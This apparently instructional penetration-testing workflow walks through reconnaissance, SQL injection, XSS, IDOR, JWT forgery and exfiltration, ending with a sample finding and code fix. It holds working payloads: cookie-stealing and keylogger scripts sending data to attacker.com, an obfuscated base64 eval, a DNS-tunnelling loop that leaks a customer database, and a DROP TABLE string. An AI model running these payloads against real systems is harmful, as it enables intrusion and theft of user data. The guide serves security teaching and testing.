## Your Penetration Testing Workflow

### Phase 1: Planning & Reconnaissance

**Scope Definition:**
```
1. What's the target? (Application, API, network, infrastructure)
2. What's in scope? (URLs, IP ranges, endpoints)
3. What's out of scope? (Production data, third-party services)
4. Rules of engagement (testing hours, notification requirements)
5. Success criteria (What vulnerabilities to find?)
```

**Information Gathering:**
```bash
# Subdomain enumeration
subfinder -d example.com -o subdomains.txt
amass enum -d example.com

# Technology stack identification
whatweb https://target.com
wappalyzer (browser extension)

# Public exposure check
shodan host target.com
censys search "target.com"

# DNS reconnaissance
dig target.com ANY
nslookup -type=NS target.com
```

### Phase 2: Vulnerability Assessment

**Active Scanning:**
```bash
# Network reconnaissance
nmap -sV -sC -p- target.com -oA scan_results

# Web vulnerability scanning
nikto -h https://target.com
nuclei -u https://target.com -t cves/

# Application-specific scanning
sqlmap -u "https://target.com/page?id=1" --batch --risk=3
```

**Manual Testing Focus:**
- Authentication mechanisms
- Authorization controls
- Input validation
- Business logic flaws
- Session management
- Error handling
- File operations

### Phase 3: Exploitation

**SQL Injection Attack Chain:**

**Step 1: Detection**
```sql
-- Test for SQL injection vulnerability
https://target.com/product?id=1' OR '1'='1
https://target.com/product?id=1' AND '1'='2
https://target.com/product?id=1' ORDER BY 10--
```

**Step 2: Database Enumeration**
```sql
-- Determine database type
https://target.com/product?id=1' AND 1=1-- (MySQL)
https://target.com/product?id=1' AND 1=1;-- (SQL Server)

-- Extract table names
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

-- Extract column names
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Step 3: Data Exfiltration**
```sql
-- Extract user credentials
' UNION SELECT username,password,email FROM users--

-- Extract sensitive data
' UNION SELECT card_number,cvv,expiry FROM payments--
```

**Impact Demonstration:**
```
 SQL INJECTION EXPLOIT SUCCESSFUL

Database: MySQL 8.0.28
Extracted: 10,000 user records
Data Includes:
- Usernames
- Hashed passwords (MD5 - weak!)
- Email addresses
- Phone numbers

Proof of Concept:
[Screenshot of database dump]

Risk: Critical - Full database compromise
```

**Cross-Site Scripting (XSS) Exploitation:**

**Reflected XSS:**
```html
<!-- Test payload -->
https://target.com/search?q=<script>alert('XSS')</script>

<!-- Session stealing payload -->
https://target.com/search?q=<script>fetch('https://attacker.com?cookie='+document.cookie)</script>

<!-- Keylogger payload -->
<script>
document.addEventListener('keypress', (e) => {
  fetch('https://attacker.com/log?key=' + e.key)
})
</script>
```

**Stored XSS:**
```html
<!-- Comment field exploitation -->
<img src=x onerror="fetch('https://attacker.com/steal?data='+document.cookie)">

<!-- Profile bio exploitation -->
<svg/onload="eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tJyk='))">
```

**Broken Access Control Exploitation:**

**Insecure Direct Object Reference (IDOR):**
```bash
# Test IDOR vulnerability
curl -H "Authorization: Bearer USER_TOKEN" \
  https://api.target.com/users/123/profile

# Try accessing other users
curl -H "Authorization: Bearer USER_TOKEN" \
  https://api.target.com/users/124/profile  # Should fail but doesn't

# Enumerate all users
for id in {1..1000}; do
  curl -H "Authorization: Bearer USER_TOKEN" \
    https://api.target.com/users/$id/profile \
    -o "user_$id.json"
done
```

**Impact:**
```
 BROKEN ACCESS CONTROL EXPLOIT

Vulnerability: Insecure Direct Object Reference (IDOR)
Endpoint: /api/users/:id/profile
Impact: Unauthorized access to all user profiles

Exploitation Steps:
1. Authenticated user can access /api/users/123/profile (their own)
2. Modify ID parameter to /api/users/124/profile
3. Server returns other user's data without authorization check
4. Automated script extracted 1,000+ user profiles

Data Exposed:
- Full names
- Email addresses
- Phone numbers
- Profile pictures
- Account creation dates
- Last login times

Risk: Critical - Privacy violation, potential identity theft
```

### Phase 4: Post-Exploitation

**Privilege Escalation Example:**

**Regular User → Admin Escalation:**
```javascript
// Exploit: Modify JWT token to gain admin privileges

// Original JWT payload (decoded)
{
  "sub": "user123",
  "role": "user",
  "iat": 1633024800
}

// Modified payload (attacker changes role)
{
  "sub": "user123",
  "role": "admin",  // Changed from "user"
  "iat": 1633024800
}

// If JWT signature not validated properly, this works!
curl -H "Authorization: Bearer [MODIFIED_TOKEN]" \
  https://api.target.com/admin/users
```

**Result:**
```
 Privilege escalation successful!
Regular user now has admin access to:
- All user management endpoints
- System configuration
- Sensitive reports
- Database backups
```

**Data Exfiltration Simulation:**
```bash
# Download entire customer database
curl -H "Authorization: Bearer [ADMIN_TOKEN]" \
  https://api.target.com/export/customers \
  -o customers_database.csv

# Size: 500MB (250,000 records)
# Includes: Names, emails, addresses, purchase history

# Exfiltrate via DNS tunneling (bypass firewall)
cat customers_database.csv | base64 | \
  while read line; do
    nslookup $line.attacker-dns.com
  done
```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

## Detailed Findings

### Finding #1: SQL Injection in Product Search

**Severity:** Critical
**CVSS Score:** 9.8 (Critical)
**CWE:** CWE-89
**OWASP:** A03:2021 – Injection

**Vulnerability Description:**
The product search functionality at `/search?q=` is vulnerable to SQL injection. An attacker can execute arbitrary SQL queries, leading to complete database compromise.

**Affected Endpoint:**
- URL: https://target.com/search?q=[PAYLOAD]
- Parameter: `q` (query parameter)
- Method: GET

**Proof of Concept:**
```sql
https://target.com/search?q=1' UNION SELECT username,password,NULL FROM users--
```

**Evidence:**
[Screenshot showing extracted user credentials]

**Impact:**
- Extraction of all user credentials (10,000+ accounts)
- Modification of database records
- Potential for privilege escalation
- Data deletion capabilities

**Remediation:**
1. Implement parameterized queries (prepared statements)
2. Use an ORM with built-in SQL injection protection
3. Validate and sanitize all user inputs
4. Apply principle of least privilege to database accounts

**Code Fix:**
```javascript
// VULNERABLE CODE:
const query = `SELECT * FROM products WHERE name LIKE '%${req.query.q}%'`
db.query(query)

// SECURE CODE:
const query = 'SELECT * FROM products WHERE name LIKE ?'
db.query(query, [`%${req.query.q}%`])
```

**References:**
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

**Verification:**
After implementing the fix, re-test with:
- `' OR '1'='1`
- `' UNION SELECT NULL--`
- `'; DROP TABLE users;--`

All should fail gracefully with no SQL execution.

```

## Real-World Attack Scenarios

### Scenario 1: Authentication Bypass via JWT Manipulation

**Target:** API using JWT for authentication

**Attack Steps:**
1. Register normal user account
2. Capture JWT token from login response
3. Decode JWT (Base64 decode)
4. Modify role claim from "user" to "admin"
5. Re-encode JWT
6. Test if signature validation is missing

**Result:** If JWT signature not verified, gain admin access

### Scenario 2: Business Logic Flaw in E-commerce

**Target:** Online store with coupon system

**Attack Steps:**
1. Apply 50% discount coupon
2. Proceed to checkout
3. Intercept checkout request
4. Modify quantity to negative number (-10)
5. Server calculates total: (-10 items × $100) × 0.5 = -$500

**Result:** Store pays user $500 instead of charging them

### Scenario 3: API Rate Limit Bypass

**Target:** API with rate limiting (100 requests/hour)

**Attack Steps:**
1. Send 100 requests (rate limit reached)
2. Change X-Forwarded-For header to different IP
3. Send 100 more requests (rate limit bypassed)
4. Repeat with different IPs

**Result:** Unlimited API access, enabling brute force attacks
